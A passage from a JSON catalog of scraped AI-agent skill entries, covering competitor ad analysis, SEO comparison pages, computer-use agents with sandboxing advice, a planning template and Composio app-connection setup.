messaging...\n```\n\n**Output**:\n```\n# Notion Ad Analysis\n\n## Overview\n- Total Ads: 23 active\n- Primary Themes: Productivity (35%), Collaboration (30%), \n  Templates (20%), AI Features (15%)\n- Ad Formats: Static images (60%), Video (40%)\n- CTA Patterns: \"Try for free\", \"Get started\"\n\n## Key Problems They're Highlighting\n\n1. **Scattered Information** (8 ads)\n   Copy: \"Stop switching between 10 different tools\"\n   Why it works: Direct pain point many teams face\n\n2. **Meeting Overload** (5 ads)\n   Copy: \"Replace unnecessary meetings with async updates\"\n   Why it works: Post-COVID remote work pain point\n\n3. **Lost Documentation** (4 ads)\n   Copy: \"Never ask 'where is that doc?' again\"\n   Why it works: Universal workplace frustration\n\n## Successful Creative Patterns\n\n### Pattern 1: Before/After Split\n- Shows chaotic tool landscape → Clean Notion workspace\n- Used in 6 high-performing ads\n- Visual metaphor is immediately clear\n\n### Pattern 2: Feature Showcase\n- GIF of actual product usage\n- Shows specific feature in 5 seconds\n- Used for new features (AI, templates)\n\n### Pattern 3: Social Proof\n- \"Join 20M users\" messaging\n- Customer logos\n- Used in 4 ads targeting enterprise\n\n## Copy That's Working\n\nBest Headlines:\n1. \"Your team's knowledge, finally in one place\"\n   → Benefit-focused, addresses pain directly\n   \n2. \"The all-in-one workspace\"\n   → Clear positioning, broad appeal\n   \n3. \"AI that actually helps you work\"\n   → Addresses AI skepticism, practical angle\n\nBest Body Copy Patterns:\n- Short sentences (under 10 words)\n- Focus on outcomes not features\n- Include specific numbers (\"Cut meetings by 50%\")\n\n## Audience Targeting Insights\n\nBased on ad variations:\n- Startup founders: Solo productivity angle\n- Team leads: Collaboration and alignment\n- Enterprise: Security and compliance mentions\n- Students: Free plan, templates, organization\n\n## Recommendations for Your Ads\n\n1. **Test the \"tool sprawl\" pain point**\n   → Strong resonance based on their ad frequency\n\n2. **Use product screenshots over abstract visuals**\n   → All their top ads show actual UI\n\n3. **Lead with the problem, not the solution**\n   → \"Tired of X?\" performs better than \"Introducing Y\"\n\n4. **Keep copy under 100 characters**\n   → Their shortest ads seem most frequent\n\n5. **Test before/after visual formats**\n   → Proven pattern in their creative\n\n## Files Saved\n- All ads: ~/competitor-ads/notion/\n- Analysis: ~/competitor-ads/notion/analysis.md\n- Best performers: ~/competitor-ads/notion/top-10/\n```\n\n**Inspired by:** Sumant Subrahmanya's use case from Lenny's Newsletter\n\n## What You Can Learn\n\n### Messaging Analysis\n- What problems they emphasize\n- How they position against competition\n- Value propositions that resonate\n- Target audience segments\n\n### Creative Patterns\n- Visual styles that work\n- Video vs. static image performance\n- Color schemes and branding\n- Layout patterns\n\n### Copy Formulas\n- Headline structures\n- Call-to-action patterns\n- Length and tone\n- Emotional triggers\n\n### Campaign Strategy\n- Seasonal campaigns\n- Product launch approaches\n- Feature announcemen",
      "tags": [
        "notion",
        "markdown",
        "ai"
      ],
      "useCases": [
        "Researching competitor ad strategies",
        "Finding inspiration for your own ads",
        "Understanding market positioning",
        "Identifying successful ad patterns",
        "Analyzing messaging that works"
      ],
      "scrapedAt": "2026-01-26T13:14:55.311Z"
    },
    {
      "id": "awesome-llm-competitive-ads-extractor",
      "name": "competitive-ads-extractor",
      "slug": "awesome-llm-competitive-ads-extractor",
      "description": "Extracts and analyzes competitors' ads from ad libraries (Facebook, LinkedIn, etc.) to understand what messaging, problems, and creative approaches are working. Helps inspire and improve your own ad campaigns.",
      "category": "Business & Marketing",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/competitive-ads-extractor",
      "content": "\n# Competitive Ads Extractor\n\nThis skill extracts your competitors' ads from ad libraries and analyzes what's working—the problems they're highlighting, use cases they're targeting, and copy/creative that's resonating.\n\n## When to Use This Skill\n\n- Researching competitor ad strategies\n- Finding inspiration for your own ads\n- Understanding market positioning\n- Identifying successful ad patterns\n- Analyzing messaging that works\n- Discovering new use cases or pain points\n- Planning ad campaigns with proven concepts\n\n## What This Skill Does\n\n1. **Extracts Ads**: Scrapes ads from Facebook Ad Library, LinkedIn, etc.\n2. **Captures Screenshots**: Saves visual copies of all ads\n3. **Analyzes Messaging**: Identifies problems, use cases, and value props\n4. **Categorizes Ads**: Groups by theme, audience, or format\n5. **Identifies Patterns**: Finds common successful approaches\n6. **Provides Insights**: Explains why certain ads likely perform well\n\n## How to Use\n\n### Basic Extraction\n\n```\nExtract all current ads from [Competitor Name] on Facebook Ad Library\n```\n\n```\nScrape ads from [Company] and analyze their messaging\n```\n\n### Specific Analysis\n\n```\nGet all ads from [Competitor] focusing on their messaging \nabout [specific problem]. What pain points are they highlighting?\n```\n\n### Competitive Set\n\n```\nExtract ads from these 5 competitors: [list]. \nCompare their approaches and tell me what's working.\n```\n\n### Specific Platform\n\n```\nGet LinkedIn ads from [Competitor] and analyze their \nB2B positioning strategy\n```\n\n## Example\n\n**User**: \"Extract ads from Notion on Facebook Ad Library and tell me what messaging is working for them.\"\n\n**Process**:\n```\nAccessing Facebook Ad Library...\nSearching for: Notion\nFound: 23 active ads\n\nExtracting screenshots...\n[████████████████████] 100%\n\nSaved to: competitor-ads/notion/\n- ad-001-collaboration.png\n- ad-002-productivity.png\n- ad-003-templates.png\n...\n\nAnalyzing messaging...\n```\n\n**Output**:\n```\n# Notion Ad Analysis\n\n## Overview\n- Total Ads: 23 active\n- Primary Themes: Productivity (35%), Collaboration (30%), \n  Templates (20%), AI Features (15%)\n- Ad Formats: Static images (60%), Video (40%)\n- CTA Patterns: \"Try for free\", \"Get started\"\n\n## Key Problems They're Highlighting\n\n1. **Scattered Information** (8 ads)\n   Copy: \"Stop switching between 10 different tools\"\n   Why it works: Direct pain point many teams face\n\n2. **Meeting Overload** (5 ads)\n   Copy: \"Replace unnecessary meetings with async updates\"\n   Why it works: Post-COVID remote work pain point\n\n3. **Lost Documentation** (4 ads)\n   Copy: \"Never ask 'where is that doc?' again\"\n   Why it works: Universal workplace frustration\n\n## Successful Creative Patterns\n\n### Pattern 1: Before/After Split\n- Shows chaotic tool landscape → Clean Notion workspace\n- Used in 6 high-performing ads\n- Visual metaphor is immediately clear\n\n### Pattern 2: Feature Showcase\n- GIF of actual product usage\n- Shows specific feature in 5 seconds\n- Used for new features (AI, templates)\n\n### Pattern 3: Social Proof\n- \"Join 20M users\" messaging\n- Customer logos\n- Used in 4 ads targeting enterprise\n\n## Copy That's Working\n\nBest Headlines:\n1. \"Your team's knowledge, finally in one place\"\n   → Benefit-focused, addresses pain directly\n   \n2. \"The all-in-one workspace\"\n   → Clear positioning, broad appeal\n   \n3. \"AI that actually helps you work\"\n   → Addresses AI skepticism, practical angle\n\nBest Body Copy Patterns:\n- Short sentences (under 10 words)\n- Focus on outcomes not features\n- Include specific numbers (\"Cut meetings by 50%\")\n\n## Audience Targeting Insights\n\nBased on ad variations:\n- Startup founders: Solo productivity angle\n- Team leads: Collaboration and alignment\n- Enterprise: Security and compliance mentions\n- Students: Free plan, templates, organization\n\n## Recommendations for Your Ads\n\n1. **Test the \"tool sprawl\" pain point**\n   → Strong resonance based on their ad frequency\n\n2. **Use product screenshots over abstract visuals**\n   → All their top ads show actual UI\n\n3. **Lead with the problem, not the solution**\n   → \"Tired of X?\" performs better than \"Introducing Y\"\n\n4. **Keep copy under 100 characters**\n   → Their shortest ads seem most frequent\n\n5. **Test before/after visual formats**\n   → Proven pattern in their creative\n\n## Files Saved\n- All ads: ~/competitor-ads/notion/\n- Analysis: ~/competitor-ads/notion/analysis.md\n- Best performers: ~/competitor-ads/notion/top-10/\n```\n\n**Inspired by:** Sumant Subrahmanya's use case from Lenny's Newsletter\n\n## What You Can Learn\n\n### Messaging Analysis\n- What problems they emphasize\n- How they position against competition\n- Value propositions that resonate\n- Target audience segments\n\n### Creative Patterns\n- Visual styles that work\n- Video vs. static image performance\n- Color schemes and branding\n- Layout patterns\n\n### Copy Formulas\n- Headline structures\n- Call-to-action patterns\n- Length and tone\n- Emotional triggers\n\n### Campaign Strategy\n- Seasonal campaigns\n- Product launch approaches\n- Feature announcemen",
      "tags": [
        "markdown",
        "ai",
        "workflow",
        "template",
        "design",
        "notion",
        "video",
        "image",
        "competitive",
        "ads"
      ],
      "useCases": [
        "Researching competitor ad strategies",
        "Finding inspiration for your own ads",
        "Understanding market positioning",
        "Identifying successful ad patterns",
        "Analyzing messaging that works"
      ],
      "scrapedAt": "2026-01-26T13:15:44.057Z"
    },
    {
      "id": "antigravity-competitor-alternatives",
      "name": "competitor-alternatives",
      "slug": "competitor-alternatives",
      "description": "When the user wants to create competitor comparison or alternative pages for SEO and sales enablement. Also use when the user mentions 'alternative page,' 'vs page,' 'competitor comparison,' 'comparison page,' '[Product] vs [Product],' '[Product] alternative,' or 'competitive landing pages.' Covers ",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/competitor-alternatives",
      "content": "\n# Competitor & Alternative Pages\n\nYou are an expert in creating competitor comparison and alternative pages. Your goal is to build pages that rank for competitive search terms, provide genuine value to evaluators, and position your product effectively.\n\n## Initial Assessment\n\nBefore creating competitor pages, understand:\n\n1. **Your Product**\n   - Core value proposition\n   - Key differentiators\n   - Ideal customer profile\n   - Pricing model\n   - Strengths and honest weaknesses\n\n2. **Competitive Landscape**\n   - Direct competitors\n   - Indirect/adjacent competitors\n   - Market positioning of each\n   - Search volume for competitor terms\n\n3. **Goals**\n   - SEO traffic capture\n   - Sales enablement\n   - Conversion from competitor users\n   - Brand positioning\n\n---\n\n## Core Principles\n\n### 1. Honesty Builds Trust\n- Acknowledge competitor strengths\n- Be accurate about your limitations\n- Don't misrepresent competitor features\n- Readers are comparing—they'll verify claims\n\n### 2. Depth Over Surface\n- Go beyond feature checklists\n- Explain *why* differences matter\n- Include use cases and scenarios\n- Show, don't just tell\n\n### 3. Help Them Decide\n- Different tools fit different needs\n- Be clear about who you're best for\n- Be clear about who competitor is best for\n- Reduce evaluation friction\n\n### 4. Modular Content Architecture\n- Competitor data should be centralized\n- Updates propagate to all pages\n- Avoid duplicating research\n- Single source of truth per competitor\n\n---\n\n## Page Formats\n\n### Format 1: [Competitor] Alternative (Singular)\n\n**Search intent**: User is actively looking to switch from a specific competitor\n\n**URL pattern**: `/alternatives/[competitor]` or `/[competitor]-alternative`\n\n**Target keywords**:\n- \"[Competitor] alternative\"\n- \"alternative to [Competitor]\"\n- \"switch from [Competitor]\"\n- \"[Competitor] replacement\"\n\n**Page structure**:\n1. Why people look for alternatives (validate their pain)\n2. Summary: You as the alternative (quick positioning)\n3. Detailed comparison (features, service, pricing)\n4. Who should switch (and who shouldn't)\n5. Migration path\n6. Social proof from switchers\n7. CTA\n\n**Tone**: Empathetic to their frustration, helpful guide\n\n---\n\n### Format 2: [Competitor] Alternatives (Plural)\n\n**Search intent**: User is researching options, earlier in journey\n\n**URL pattern**: `/alternatives/[competitor]-alternatives` or `/best-[competitor]-alternatives`\n\n**Target keywords**:\n- \"[Competitor] alternatives\"\n- \"best [Competitor] alternatives\"\n- \"tools like [Competitor]\"\n- \"[Competitor] competitors\"\n\n**Page structure**:\n1. Why people look for alternatives (common pain points)\n2. What to look for in an alternative (criteria framework)\n3. List of alternatives (you first, but include real options)\n4. Comparison table (summary)\n5. Detailed breakdown of each alternative\n6. Recommendation by use case\n7. CTA\n\n**Tone**: Objective guide, you're one option among several (but positioned well)\n\n**Important**: Include 4-7 real alternatives. Being genuinely helpful builds trust and ranks better.\n\n---\n\n### Format 3: You vs [Competitor]\n\n**Search intent**: User is directly comparing you to a specific competitor\n\n**URL pattern**: `/vs/[competitor]` or `/compare/[you]-vs-[competitor]`\n\n**Target keywords**:\n- \"[You] vs [Competitor]\"\n- \"[Competitor] vs [You]\"\n- \"[You] compared to [Competitor]\"\n- \"[You] or [Competitor]\"\n\n**Page structure**:\n1. TL;DR summary (key differences in 2-3 sentences)\n2. At-a-glance comparison table\n3. Detailed comparison by category:\n   - Features\n   - Pricing\n   - Service & support\n   - Ease of use\n   - Integrations\n4. Who [You] is best for\n5. Who [Competitor] is best for (be honest)\n6. What customers say (testimonials from switchers)\n7. Migration support\n8. CTA\n\n**Tone**: Confident but fair, acknowledge where competitor excels\n\n---\n\n### Format 4: [Competitor A] vs [Competitor B]\n\n**Search intent**: User comparing two competitors (not you directly)\n\n**URL pattern**: `/compare/[competitor-a]-vs-[competitor-b]`\n\n**Target keywords**:\n- \"[Competitor A] vs [Competitor B]\"\n- \"[Competitor A] or [Competitor B]\"\n- \"[Competitor A] compared to [Competitor B]\"\n\n**Page structure**:\n1. Overview of both products\n2. Comparison by category\n3. Who each is best for\n4. The third option (introduce yourself)\n5. Comparison table (all three)\n6. CTA\n\n**Tone**: Objective analyst, earn trust through fairness, then introduce yourself\n\n**Why this works**: Captures search traffic for competitor terms, positions you as knowledgeable, introduces you to qualified audience.\n\n---\n\n## Index Pages\n\nEach format needs an index page that lists all pages of that type. These hub pages serve as navigation aids, SEO consolidators, and entry points for visitors exploring multiple comparisons.\n\n### Alternatives Index\n\n**URL**: `/alternatives` or `/alternatives/index`\n\n**Purpose**: Lists all \"[Competitor] Alternative\" pages\n\n**Page structure**:\n1. Headline: \"[Your Product] as an Alternative\"\n2. Brief intro on why people switch to you",
      "tags": [
        "markdown",
        "api",
        "ai",
        "automation",
        "workflow",
        "template",
        "document",
        "security",
        "rag",
        "seo"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:41.339Z"
    },
    {
      "id": "antigravity-computer-use-agents",
      "name": "computer-use-agents",
      "slug": "computer-use-agents",
      "description": "Build AI agents that interact with computers like humans do - viewing screens, moving cursors, clicking buttons, and typing text. Covers Anthropic's Computer Use, OpenAI's Operator/CUA, and open-source alternatives. Critical focus on sandboxing, security, and handling the unique challenges of vision",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/computer-use-agents",
      "content": "\n# Computer Use Agents\n\n## Patterns\n\n### Perception-Reasoning-Action Loop\n\nThe fundamental architecture of computer use agents: observe screen,\nreason about next action, execute action, repeat. This loop integrates\nvision models with action execution through an iterative pipeline.\n\nKey components:\n1. PERCEPTION: Screenshot captures current screen state\n2. REASONING: Vision-language model analyzes and plans\n3. ACTION: Execute mouse/keyboard operations\n4. FEEDBACK: Observe result, continue or correct\n\nCritical insight: Vision agents are completely still during \"thinking\"\nphase (1-5 seconds), creating a detectable pause pattern.\n\n\n**When to use**: ['Building any computer use agent from scratch', 'Integrating vision models with desktop control', 'Understanding agent behavior patterns']\n\n```python\nfrom anthropic import Anthropic\nfrom PIL import Image\nimport base64\nimport pyautogui\nimport time\n\nclass ComputerUseAgent:\n    \"\"\"\n    Perception-Reasoning-Action loop implementation.\n    Based on Anthropic Computer Use patterns.\n    \"\"\"\n\n    def __init__(self, client: Anthropic, model: str = \"claude-sonnet-4-20250514\"):\n        self.client = client\n        self.model = model\n        self.max_steps = 50  # Prevent runaway loops\n        self.action_delay = 0.5  # Seconds between actions\n\n    def capture_screenshot(self) -> str:\n        \"\"\"Capture screen and return base64 encoded image.\"\"\"\n        screenshot = pyautogui.screenshot()\n        # Resize for token efficiency (1280x800 is good balance)\n        screenshot = screenshot.resize((1280, 800), Image.LANCZOS)\n\n        import io\n        buffer = io.BytesIO()\n        screenshot.save(buffer, format=\"PNG\")\n        return base64.b64encode(buffer.getvalue()).decode()\n\n    def execute_action(self, action: dict) -> dict:\n        \"\"\"Execute mouse/keyboard action on the computer.\"\"\"\n        action_type = action.get(\"type\")\n\n        if action_type == \"click\":\n            x, y = action[\"x\"], action[\"y\"]\n            button = action.get(\"button\", \"left\")\n            pyautogui.click(x, y, button=button)\n            return {\"success\": True, \"action\": f\"clicked at ({x}, {y})\"}\n\n        elif action_type == \"type\":\n            text = action[\"text\"]\n            pyautogui.typewrite(text, interval=0.02)\n            return {\"success\": True, \"action\": f\"typed {len(text)} chars\"}\n\n        elif action_type == \"key\":\n            key = action[\"key\"]\n            pyautogui.press(key)\n            return {\"success\": True, \"action\": f\"pressed {key}\"}\n\n        elif action_type == \"scroll\":\n            direction = action.get(\"direction\", \"down\")\n            amount = action.get(\"amount\", 3)\n            scroll = -amount if direction == \"down\" else amount\n            pyautogui.scroll(scroll)\n            return {\"success\": True, \"action\": f\"scrolled {dir\n```\n\n### Sandboxed Environment Pattern\n\nComputer use agents MUST run in isolated, sandboxed environments.\nNever give agents direct access to your main system - the security\nrisks are too high. Use Docker containers with virtual desktops.\n\nKey isolation requirements:\n1. NETWORK: Restrict to necessary endpoints only\n2. FILESYSTEM: Read-only or scoped to temp directories\n3. CREDENTIALS: No access to host credentials\n4. SYSCALLS: Filter dangerous system calls\n5. RESOURCES: Limit CPU, memory, time\n\nThe goal is \"blast radius minimization\" - if the agent goes wrong,\ndamage is contained to the sandbox.\n\n\n**When to use**: ['Deploying any computer use agent', 'Testing agent behavior safely', 'Running untrusted automation tasks']\n\n```python\n# Dockerfile for sandboxed computer use environment\n# Based on Anthropic's reference implementation pattern\n\nFROM ubuntu:22.04\n\n# Install desktop environment\nRUN apt-get update && apt-get install -y \\\n    xvfb \\\n    x11vnc \\\n    fluxbox \\\n    xterm \\\n    firefox \\\n    python3 \\\n    python3-pip \\\n    supervisor\n\n# Security: Create non-root user\nRUN useradd -m -s /bin/bash agent && \\\n    mkdir -p /home/agent/.vnc\n\n# Install Python dependencies\nCOPY requirements.txt /tmp/\nRUN pip3 install -r /tmp/requirements.txt\n\n# Security: Drop capabilities\nRUN apt-get install -y --no-install-recommends libcap2-bin && \\\n    setcap -r /usr/bin/python3 || true\n\n# Copy agent code\nCOPY --chown=agent:agent . /app\nWORKDIR /app\n\n# Supervisor config for virtual display + VNC\nCOPY supervisord.conf /etc/supervisor/conf.d/\n\n# Expose VNC port only (not desktop directly)\nEXPOSE 5900\n\n# Run as non-root\nUSER agent\n\nCMD [\"/usr/bin/supervisord\", \"-c\", \"/etc/supervisor/conf.d/supervisord.conf\"]\n\n---\n\n# docker-compose.yml with security constraints\nversion: '3.8'\n\nservices:\n  computer-use-agent:\n    build: .\n    ports:\n      - \"5900:5900\"  # VNC for observation\n      - \"8080:8080\"  # API for control\n\n    # Security constraints\n    security_opt:\n      - no-new-privileges:true\n      - seccomp:seccomp-profile.json\n\n    # Resource limits\n    deploy:\n      resources:\n        limits:\n          cpus: '2'\n          memory: 4G\n        reservations:\n          cpus: '0.5'\n      ",
      "tags": [
        "python",
        "api",
        "claude",
        "ai",
        "agent",
        "automation",
        "image",
        "security",
        "docker",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:42.565Z"
    },
    {
      "id": "antigravity-concise-planning",
      "name": "concise-planning",
      "slug": "concise-planning",
      "description": "Use when a user asks for a plan for a coding task, to generate a clear, actionable, and atomic checklist.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/concise-planning",
      "content": "\n# Concise Planning\n\n## Goal\n\nTurn a user request into a **single, actionable plan** with atomic steps.\n\n## Workflow\n\n### 1. Scan Context\n\n- Read `README.md`, docs, and relevant code files.\n- Identify constraints (language, frameworks, tests).\n\n### 2. Minimal Interaction\n\n- Ask **at most 1–2 questions** and only if truly blocking.\n- Make reasonable assumptions for non-blocking unknowns.\n\n### 3. Generate Plan\n\nUse the following structure:\n\n- **Approach**: 1-3 sentences on what and why.\n- **Scope**: Bullet points for \"In\" and \"Out\".\n- **Action Items**: A list of 6-10 atomic, ordered tasks (Verb-first).\n- **Validation**: At least one item for testing.\n\n## Plan Template\n\n```markdown\n# Plan\n\n<High-level approach>\n\n## Scope\n\n- In:\n- Out:\n\n## Action Items\n\n[ ] <Step 1: Discovery>\n[ ] <Step 2: Implementation>\n[ ] <Step 3: Implementation>\n[ ] <Step 4: Validation/Testing>\n[ ] <Step 5: Rollout/Commit>\n\n## Open Questions\n\n- <Question 1 (max 3)>\n```\n\n## Checklist Guidelines\n\n- **Atomic**: Each step should be a single logical unit of work.\n- **Verb-first**: \"Add...\", \"Refactor...\", \"Verify...\".\n- **Concrete**: Name specific files or modules when possible.\n",
      "tags": [
        "markdown",
        "ai",
        "workflow",
        "template"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:43.833Z"
    },
    {
      "id": "composio-connect",
      "name": "connect",
      "slug": "connect",
      "description": "Connect Claude to any app. Send emails, create issues, post messages, update databases - take real actions across Gmail, Slack, GitHub, Notion, and 1000+ services.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/connect",
      "content": "\n# Connect\n\nConnect Claude to any app. Stop generating text about what you could do - actually do it.\n\n## When to Use This Skill\n\nUse this skill when you need Claude to:\n\n- **Send that email** instead of drafting it\n- **Create that issue** instead of describing it\n- **Post that message** instead of suggesting it\n- **Update that database** instead of explaining how\n\n## What Changes\n\n| Without Connect | With Connect |\n|-----------------|--------------|\n| \"Here's a draft email...\" | Sends the email |\n| \"You should create an issue...\" | Creates the issue |\n| \"Post this to Slack...\" | Posts it |\n| \"Add this to Notion...\" | Adds it |\n\n## Supported Apps\n\n**1000+ integrations** including:\n\n- **Email:** Gmail, Outlook, SendGrid\n- **Chat:** Slack, Discord, Teams, Telegram\n- **Dev:** GitHub, GitLab, Jira, Linear\n- **Docs:** Notion, Google Docs, Confluence\n- **Data:** Sheets, Airtable, PostgreSQL\n- **CRM:** HubSpot, Salesforce, Pipedrive\n- **Storage:** Drive, Dropbox, S3\n- **Social:** Twitter, LinkedIn, Reddit\n\n## Setup\n\n### 1. Get API Key\n\nGet your free key at [platform.composio.dev](https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills)\n\n### 2. Set Environment Variable\n\n```bash\nexport COMPOSIO_API_KEY=\"your-key\"\n```\n\n### 3. Install\n\n```bash\npip install composio          # Python\nnpm install @composio/core    # TypeScript\n```\n\nDone. Claude can now connect to any app.\n\n## Examples\n\n### Send Email\n```\nEmail sarah@acme.com - Subject: \"Shipped!\" Body: \"v2.0 is live, let me know if issues\"\n```\n\n### Create GitHub Issue\n```\nCreate issue in my-org/repo: \"Mobile timeout bug\" with label:bug\n```\n\n### Post to Slack\n```\nPost to #engineering: \"Deploy complete - v2.4.0 live\"\n```\n\n### Chain Actions\n```\nFind GitHub issues labeled \"bug\" from this week, summarize, post to #bugs on Slack\n```\n\n## How It Works\n\nUses Composio Tool Router:\n\n1. **You ask** Claude to do something\n2. **Tool Router finds** the right tool (1000+ options)\n3. **OAuth handled** automatically\n4. **Action executes** and returns result\n\n### Code\n\n```python\nfrom composio import Composio\nfrom claude_agent_sdk.client import ClaudeSDKClient\nfrom claude_agent_sdk.types import ClaudeAgentOptions\nimport os\n\ncomposio = Composio(api_key=os.environ[\"COMPOSIO_API_KEY\"])\nsession = composio.create(user_id=\"user_123\")\n\noptions = ClaudeAgentOptions(\n    system_prompt=\"You can take actions in external apps.\",\n    mcp_servers={\n        \"composio\": {\n            \"type\": \"http\",\n            \"url\": session.mcp.url,\n            \"headers\": {\"x-api-key\": os.environ[\"COMPOSIO_API_KEY\"]},\n        }\n    },\n)\n\nasync with ClaudeSDKClient(options) as client:\n    await client.query(\"Send Slack message to #general: Hello!\")\n```\n\n## Auth Flow\n\nFirst time using an app:\n```\nTo send emails, I need Gmail access.\nAuthorize here: https://...\nSay \"connected\" when done.\n```\n\nConnection persists after that.\n\n## Framework Support\n\n| Framework | Install |\n|-----------|---------|\n| Claude Agent SDK | `pip install composio claude-agent-sdk` |\n| OpenAI Agents | `pip install composio openai-agents` |\n| Vercel AI | `npm install @composio/core @composio/vercel` |\n| LangChain | `pip install composio-langchain` |\n| Any MCP Client | Use `session.mcp.url` |\n\n## Troubleshooting\n\n- **Auth required** → Click link, authorize, say \"connected\"\n- **Action failed** → Check permissions in target app\n- **Tool not found** → Be specific: \"Slack #general\" not \"send message\"\n\n---\n\n<p align=\"center\">\n  <b>Join 20,000+ developers building agents that ship</b>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills\">\n    <img src=\"https://img.shields.io/badge/Get_Started_Free-4F46E5?style=for-the-badge\" alt=\"Get Started\"/>\n  </a>\n</p>\n",
      "tags": [
        "typescript",
        "python",
        "api",
        "git",
        "github",
        "slack",
        "notion",
        "gmail",
        "cli",
        "mcp"
      ],
      "useCases": [
        "**Send that email** instead of drafting it",
        "**Create that issue** instead of describing it",
        "**Post that message** instead of suggesting it",
        "**Update that database** instead of explaining how"
      ],
      "scrapedAt": "2026-01-26T13:14:59.003Z"
    },
    {
      "id": "composio-connect-apps-plugin",
      "name": "Connect Apps Plugin",
      "slug": "connect-apps-plugin",
      "description": "Let Claude perform real actions in 500+ apps. Handles auth and connections using Composio under the hood.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/connect-apps-plugin",
      "content": "# Connect Apps Plugin\n\nLet Claude perform real actions in 500+ apps. Handles auth and connections using Composio under the hood.\n\n## Install\n\n```bash\nclaude --plugin-dir ./connect-apps-plugin\n```\n\nThen run the setup:\n```\n/connect-apps:setup\n```\n\n## What You Get\n\nOnce installed, Claude can:\n- **Send emails** via Gmail, Outlook\n- **Create issues** on GitHub, GitLab, Jira, Linear\n- **Post messages** to Slack, Discord, Teams\n- **Update docs** in Notion, Google Docs\n- **Manage data** in Sheets, Airtable, databases\n- **And 500+ more actions**\n\n## How It Works\n\n1. Get a free API key from [platform.composio.dev](https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills)\n2. Run `/connect-apps:setup` and paste your key\n3. Restart Claude Code\n4. First time using an app, you'll authorize via OAuth\n5. That's it - Claude can now take real actions\n\n## Try It\n\nAfter setup, ask Claude:\n```\nSend me a test email at myemail@example.com\n```\n\n---\n\n<p align=\"center\">\n  <a href=\"https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills\">\n    <img src=\"https://img.shields.io/badge/Get_API_Key-4F46E5?style=for-the-badge\" alt=\"Get API Key\"/>\n  </a>\n</p>\n",
      "tags": [
        "api",
        "git",
        "github",
        "slack",
        "notion",
        "gmail",
        "ai",
        "claude"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:56.465Z"
    },
    {
      "id": "composio-connect-apps",
      "name": "connect-apps",
      "slug": "connect-apps",
      "description": "Connect Claude to external apps like Gmail, Slack, GitHub. Use this skill when the user wants to send emails, create issues, post messages, or take actions in external services.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/connect-apps",
      "content": "\n# Connect Apps\n\nConnect Claude to 1000+ apps. Actually send emails, create issues, post messages - not just generate text about it.\n\n## Quick Start\n\n### Step 1: Install the Plugin\n\n```\n/plugin install composio-toolrouter\n```\n\n### Step 2: Run Setup\n\n```\n/composio-toolrouter:setup\n```\n\nThis will:\n- Ask for your free API key (get one at [platform.composio.dev](https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills))\n- Configure Claude's connection to 1000+ apps\n- Take about 60 seconds\n\n### Step 3: Try It!\n\nAfter setup, restart Claude Code and try:\n\n```\nSend me a test email at YOUR_EMAIL@example.com\n```\n\nIf it works, you're connected!\n\n## What You Can Do\n\n| Ask Claude to... | What happens |\n|------------------|--------------|\n| \"Send email to sarah@acme.com about the launch\" | Actually sends the email |\n| \"Create GitHub issue: fix login bug\" | Creates the issue |\n| \"Post to Slack #general: deploy complete\" | Posts the message |\n| \"Add meeting notes to Notion\" | Adds to Notion |\n\n## Supported Apps\n\n**Email:** Gmail, Outlook, SendGrid\n**Chat:** Slack, Discord, Teams, Telegram\n**Dev:** GitHub, GitLab, Jira, Linear\n**Docs:** Notion, Google Docs, Confluence\n**Data:** Sheets, Airtable, PostgreSQL\n**And 1000+ more...**\n\n## How It Works\n\n1. You ask Claude to do something\n2. Composio Tool Router finds the right tool\n3. First time? You'll authorize via OAuth (one-time)\n4. Action executes and returns result\n\n## Troubleshooting\n\n- **\"Plugin not found\"** → Make sure you ran `/plugin install composio-toolrouter`\n- **\"Need to authorize\"** → Click the OAuth link Claude provides, then say \"done\"\n- **Action failed** → Check you have permissions in the target app\n\n---\n\n<p align=\"center\">\n  <b>Join 20,000+ developers building agents that ship</b>\n</p>\n\n<p align=\"center\">\n  <a href=\"https://platform.composio.dev/?utm_source=Github&utm_content=AwesomeSkills\">\n    <img src=\"https://img.shields.io/badge/Get_Started_Free-4F46E5?style=for-the-badge\" alt=\"Get Started\"/>\n  </a>\n</p>\n",
      "tags": [
        "api",
        "git",
        "github",
        "slack",
        "notion",
        "gmail",
        "cli",
        "ai",
        "claude"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:57.775Z"
    },
    {
      "id": "antigravity-content-creator",
      "name": "content-creator",
      "slug": "content-creator",
      "description": "Create SEO-optimized marketing content with consistent brand voice. Includes brand voice analyzer, SEO optimizer, content frameworks, and social media templates. Use when writing blog posts, creating social media content, analyzing brand voice, optimizing SEO, planning content calendars, or when use",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
